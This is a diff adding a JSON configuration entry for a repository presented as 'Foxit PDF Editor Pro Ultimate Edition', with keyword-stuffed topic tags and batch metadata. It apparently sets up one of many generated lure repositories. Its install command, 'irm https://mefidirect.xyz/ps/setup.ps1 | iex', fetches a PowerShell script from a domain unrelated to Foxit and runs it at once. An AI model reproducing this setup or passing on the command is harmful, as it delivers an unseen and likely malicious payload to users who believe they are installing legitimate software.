@@ -1,0 +1,28 @@
+{
+  "repo": "foxit-pdf-editor-pro-ultimate-edition",
+  "product": "Foxit PDF Editor Pro Ultimate Edition",
+  "kind": "office",
+  "install_type": "download",
+  "download_url": "https://foxit-pdf.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "office",
+  "topics": [
+    "foxit-pdf-installer",
+    "foxit-pdf-win64",
+    "office-suite",
+    "template-library",
+    "pc-toolkit",
+    "foxit-pdf-release",
+    "workspace-apps",
+    "foxit-pdf-guide",
+    "workstation-ready",
+    "modern-ui",
+    "native-windows",
+    "print-tools",
+    "x64-build",
+    "foxit-pdf-getting-started"
+  ]
+}
